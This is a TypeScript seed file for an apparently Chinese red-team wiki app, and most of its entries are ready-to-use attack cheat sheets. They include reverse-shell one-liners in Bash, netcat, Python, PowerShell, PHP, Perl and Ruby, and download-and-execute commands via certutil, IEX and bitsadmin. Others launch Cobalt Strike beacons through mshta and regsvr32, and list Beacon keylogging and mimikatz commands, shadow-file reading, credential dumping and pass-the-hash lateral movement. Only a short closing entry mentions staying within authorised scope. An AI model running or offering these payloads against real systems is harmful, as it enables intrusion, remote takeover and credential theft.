/**
 * 红队 Wiki —— 分类定义 + 内置速查数据（种子）。
 *
 * 分类 id 与 internal/wiki/seed.go 的 BuiltinSeed 一一对应；
 * 内置数据在桌面端由后端首次打开时灌入 wiki.db，在浏览器开发模式
 * 由 lib/wiki.ts 首次使用时灌入 localStorage，两者内容保持一致。
 */

/** 分类元数据 */
export interface WikiCategory {
  id: string;
  name: string;
  icon: string; // lucide-react 图标名（lib/icons.tsx）
  description: string;
}

/** 内置条目种子 */
export interface WikiSeedEntry {
  category: string;
  title: string;
  content: string; // markdown（代码块用 4 空格缩进）
}

export const WIKI_CATEGORIES: WikiCategory[] = [
  { id: 'security', name: '安全 Wiki', icon: 'ShieldCheck', description: '常见 Web 漏洞速查、渗透流程' },
  { id: 'tools', name: '工具 Wiki', icon: 'Wrench', description: 'Nmap / SQLMap / Nuclei 常用命令' },
  { id: 'revshell', name: '反弹 Shell', icon: 'Terminal', description: '各语言反弹 shell 命令' },
  { id: 'commands', name: '红队命令', icon: 'Zap', description: '信息收集、提权、横向移动命令' },
  { id: 'download', name: '下载命令', icon: 'HardDrive', description: 'Linux / Windows 文件下载' },
  { id: 'cs', name: 'CS 上线', icon: 'Radio', description: 'Cobalt Strike 上线与操作' },
];

/** 按 id 取分类（未知返回 undefined） */
export function wikiCategoryById(id: string): WikiCategory | undefined {
  return WIKI_CATEGORIES.find((c) => c.id === id);
}

export const WIKI_SEED: WikiSeedEntry[] = [
  // —— 反弹 Shell ——
  {
    category: 'revshell',
    title: 'Bash 反弹 Shell',
    content: `## Bash TCP 反弹

    bash -i >& /dev/tcp/攻击机IP/端口 0>&1

## 常见变体

    # 显式指定 bash 路径（部分环境 /bin/sh 非 bash）
    /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1

    # exec 形式（适合写入脚本）
    exec 5<>/dev/tcp/10.0.0.1/4444; cat <&5 | while read line; do $line 2>&5 >&5; done

## 注意

- 目标若为 Debian/Ubuntu 需确认存在 **/dev/tcp** 支持（bash 内建）。
- 端口建议用 53/80/443 等常见端口便于出网。`,
  },
  {
    category: 'revshell',
    title: 'Netcat 反弹 Shell',
    content: `## 传统 nc（-e 支持）

    nc -e /bin/sh 10.0.0.1 4444

## 无 -e 版本的 nc

    # 攻击机监听两个端口（4444 收、4445 发）
    nc 10.0.0.1 4444 | /bin/sh | nc 10.0.0.1 4445

## OpenBSD nc

    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f

> 攻击机监听：**nc -lvnp 4444**`,
  },
  {
    category: 'revshell',
    title: 'Python 反弹 Shell',
    content: `## Python 2/3 通用（一行）

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

## 仅 pty 版本

    python -c 'import pty,socket,os;s=socket.socket();s.connect(("10.0.0.1",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

> 目标为 Windows 时把 **/bin/sh** 换成 **cmd.exe**。`,
  },
  {
    category: 'revshell',
    title: 'PowerShell 反弹 Shell',
    content: `## PowerShell 一句话

    powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.0.0.1',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$o=$r+'PS '+(pwd).Path+'> ';$t=([text.encoding]::ASCII).GetBytes($o);$s.Write($t,0,$t.Length)}"

## 编码绕过（base64）

先把上面命令 UTF-16LE 编码为 base64，再：

    powershell -nop -enc <BASE64>`,
  },
  {
    category: 'revshell',
    title: 'PHP / Perl / Ruby 反弹 Shell',
    content: `## PHP

    php -r '$s=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

## Perl

    perl -e 'use Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

## Ruby

    ruby -rsocket -e 'f=TCPSocket.open("10.0.0.1",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
  },
  {
    category: 'revshell',
    title: '反弹 Shell TTY 升级',
    content: `拿到反弹 shell 后建议立即升级为全功能 TTY：

    # 1. 生成 pty
    python -c 'import pty;pty.spawn("/bin/bash")'
    # 或
    python3 -c 'import pty;pty.spawn("/bin/bash")'

    # 2. 挂起回前台（Ctrl+Z 回到攻击机）
    stty raw -echo; fg

    # 3. 目标机
    export TERM=xterm
    stty rows 50 cols 200

> 无 python 时用 **script /dev/null -c /bin/bash** 或 **stty** 手工调整。`,
  },

  // —— 下载命令 ——
  {
    category: 'download',
    title: 'Linux 下载文件',
    content: `## wget

    wget http://10.0.0.1/exp -O /tmp/exp

## curl

    curl http://10.0.0.1/exp -o /tmp/exp

## 无 wget/curl 时

    # 利用 /dev/tcp
    exec 3<>/dev/tcp/10.0.0.1/80
    echo -e "GET /exp HTTP/1.0\r\nHost: 10.0.0.1\r\n\r\n" >&3
    cat <&3 > /tmp/exp`,
  },
  {
    category: 'download',
    title: 'Windows 下载文件',
    content: `## certutil（最常用）

    certutil -urlcache -split -f http://10.0.0.1/exp.exe C:\Windows\Temp\exp.exe

## PowerShell

    powershell -nop -c "Invoke-WebRequest -Uri http://10.0.0.1/exp.exe -OutFile C:\Windows\Temp\exp.exe"
    # 或下载并执行
    powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/a.ps1')"

## bitsadmin

    bitsadmin /transfer n http://10.0.0.1/exp.exe C:\Windows\Temp\exp.exe

## certutil 校验 MD5（顺手做完整性检查）

    certutil -hashfile C:\Windows\Temp\exp.exe MD5`,
  },

  // —— CS 上线 ——
  {
    category: 'cs',
    title: 'Cobalt Strike 常见上线方式',
    content: `## PowerShell 一句话（无落地）

    powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://CS地址/a'))"

## mshta（hta 木马）

    mshta http://CS地址/a.hta

## regsvr32（sct 木马）

    regsvr32 /s /n /u /i:http://CS地址/a.sct scrobj.dll

## 生成载荷

CS 菜单：Attack → Packages → Windows Executable（或 PowerShell/HTA/SCT 等）。`,
  },
  {
    category: 'cs',
    title: 'CS 常用操作命令',
    content: `## Beacon 常用命令

    shell <cmd>            # 执行 cmd
    powershell <cmd>       # 执行 powershell
    upload /local/path      # 上传文件
    download <remote>       # 下载文件
    screenshot              # 截图
    keylogger               # 键盘记录
    mimikatz                # 提权/抓凭据
    hashdump                 # 导出哈希
    socks 1080               # 开启 SOCKS 代理
    portscan 10.0.0.0/24    # 内网端口扫描

## 提权 / 横向

    elevate svc-exe        # 提权
    spawn <listener>        # 派生会话
    jump psexec <target>    # 横向移动`,
  },

  // —— 红队命令 ——
  {
    category: 'commands',
    title: 'Linux 信息收集',
    content: `    # 系统与用户
    uname -a; cat /etc/os-release; id; whoami
    cat /etc/passwd; cat /etc/shadow 2>/dev/null

    # 网络
    ip a; route -n; cat /etc/hosts; cat /etc/resolv.conf
    ss -tulnp; netstat -tulnp

    # 进程与服务
    ps aux; systemctl list-units --type=service
    cat /etc/crontab; ls -la /etc/cron*

    # 敏感文件
    find / -name "*.conf" -o -name "*.key" -o -name "*password*" 2>/dev/null
    grep -rn "password" /etc 2>/dev/null`,
  },
  {
    category: 'commands',
    title: 'Windows 信息收集',
    content: `    # 系统与用户
    systeminfo; whoami /all; net user; net localgroup administrators

    # 网络
    ipconfig /all; route print; arp -a; netstat -ano

    # 进程与服务
    tasklist /svc; wmic process list brief

    # 域环境
    net view /domain; net group "domain admins" /domain`,
  },
  {
    category: 'commands',
    title: 'Linux 提权命令',
    content: `    # 可写文件 / SUID
    find / -writable -type f 2>/dev/null
    find / -perm -4000 -type f 2>/dev/null

    # sudo 配置
    sudo -l

    # 定时任务 / 计划任务
    cat /etc/crontab; ls -la /etc/cron.*

    # 内核版本对照漏洞
    uname -r

    # 常见的可提权服务
    systemctl list-units --type=service | grep -iE "root|db|docker"`,
  },
  {
    category: 'commands',
    title: '横向移动常用命令',
    content: `## 凭据复用（内网常见）

    # psexec（Windows）
    psexec \\target -u user -p pass cmd

    # wmiexec
    wmiexec.py user:pass@target

    # smbexec
    smbexec.py user:pass@target

## 密码喷洒 / 哈希传递

    # hash 传递（impacket）
    secretsdump.py user:pass@target
    pth-winexe -U user%hash //target cmd`,
  },

  // —— 工具 Wiki ——
  {
    category: 'tools',
    title: 'Nmap 常用命令',
    content: `    # 端口扫描
    nmap -sS -sV -p- --min-rate 1000 -T4 <target>
    nmap -sC -sV -p 22,80,443 <target>

    # 服务/脚本
    nmap --script vuln <target>
    nmap --script smb-enum-shares -p445 <target>

    # 存活主机
    nmap -sn 10.0.0.0/24`,
  },
  {
    category: 'tools',
    title: 'SQLMap 常用命令',
    content: `    # 基础注入
    sqlmap -u "http://target/?id=1" --batch

    # 带 cookie / 指定参数
    sqlmap -u "http://target/?id=1" --cookie="PHPSESSID=xxx"

    # 获取数据
    sqlmap -u "http://target/?id=1" --dbs
    sqlmap -u "http://target/?id=1" -D dbname --tables
    sqlmap -u "http://target/?id=1" -D dbname -T users --dump

    # 提权辅助
    sqlmap -u "http://target/?id=1" --os-shell`,
  },
  {
    category: 'tools',
    title: 'Nuclei 常用命令',
    content: `    # 单目标
    nuclei -u http://target -t cves/

    # 批量 + 并发
    nuclei -l targets.txt -t cves/ -c 50 -o results.txt

    # 指定模板目录
    nuclei -u http://target -t nuclei-templates/http/

    # 输出报告
    nuclei -u http://target -t cves/ -json -o out.json`,
  },

  // —— 安全 Wiki ——
  {
    category: 'security',
    title: '常见 Web 漏洞速查',
    content: `## OWASP Top 10（常见项）

- SQL 注入：参数拼接、报错/盲注/时间盲注
- 命令注入：**;id**、**|whoami**、**反引号 whoami**
- 文件上传：绕过扩展名/内容/MIME，getshell
- 文件包含：LFI/RFI
- SSRF：内网探测、读文件
- XXE：外部实体注入
- 反序列化：Java/PHP 反序列化 RCE
- 越权：IDOR、水平/垂直越权
- XSS：反射/存储/DOM
- 逻辑漏洞：验证码、支付、密码重置

## 常见测试点

    登录框：弱口令/爆破/SQL注入
    上传点：getshell
    搜索框：XSS/SQL注入
    接口：越权/信息泄露`,
  },
  {
    category: 'security',
    title: '渗透测试流程',
    content: `## 标准流程

1. **信息收集**：域名/IP/子域/端口/指纹/目录
2. **漏洞探测**：Web 漏洞、服务漏洞、弱口令
3. **漏洞利用**：getshell、提权
4. **后渗透**：横向移动、凭据窃取、权限维持
5. **报告**：漏洞描述、复现步骤、修复建议

## 授权边界

- 仅在授权范围内测试
- 不触碰生产数据的完整性
- 记录全程操作日志`,
  },
];
